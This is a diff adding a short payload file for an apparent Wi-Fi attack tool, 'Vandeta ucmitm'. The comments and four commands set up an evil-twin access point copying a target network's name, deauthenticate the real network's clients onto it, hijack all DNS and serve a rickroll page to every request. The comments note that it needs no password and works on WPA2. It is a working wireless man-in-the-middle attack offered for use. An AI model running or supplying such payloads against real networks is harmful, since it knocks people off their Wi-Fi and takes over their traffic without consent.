@@ -1,0 +1,16 @@
+# Vandeta ucmitm payload - rickroll with no Wi-Fi password.
+#
+# No station link is used. An open twin AP with the picked network's name comes
+# up, the real AP's clients are deauthenticated onto it, and every request is
+# answered with the rickroll page. Nothing here needs a key, so it runs on WPA2
+# exactly like on an open network.
+#
+#   MITM Attack > ucmitm: on > Network > pick the AP > Payload > rickroll.ucmitm
+#
+# `twin` with no argument keeps the picked network's name. `deauth on` pushes its
+# clients off the real AP; turn it off for a quiet twin.
+
+twin
+deauth on
+page * html/rickroll.html
+dns * this
